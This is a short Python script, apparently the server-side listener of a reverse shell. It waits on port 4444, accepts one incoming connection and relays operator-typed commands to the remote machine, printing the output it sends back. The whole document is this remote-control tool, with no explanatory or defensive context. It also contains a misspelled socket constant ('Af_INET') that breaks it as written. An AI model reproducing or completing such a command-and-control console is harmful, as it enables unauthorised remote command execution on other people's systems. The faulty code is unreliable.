#serverside
import socket
def set_socket(ip, port):
    s=socket.socket(socket.Af_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((ip,port))
    s.listen(1)
    conn, addr=s.accept()
    return conn,addr

def command(conn, addr):
    print("[+] Connected to", addr)
    while True:
        command=input(">")
        if command=="exit":
            conn.send(B"EXIT")
            conn.close()
            break
        elif command=="":
            print("Input comand:")
        else:
            conn.send(command.encode())
            output=conn.recv(65535)
            print(output.decode("euc-kr","ignore"),end="")


if __name__=="__main__":
    ip="0.0.0.0"
    port=4444
    conn,addr=set_socket(ip,port)
    command(conn,addr)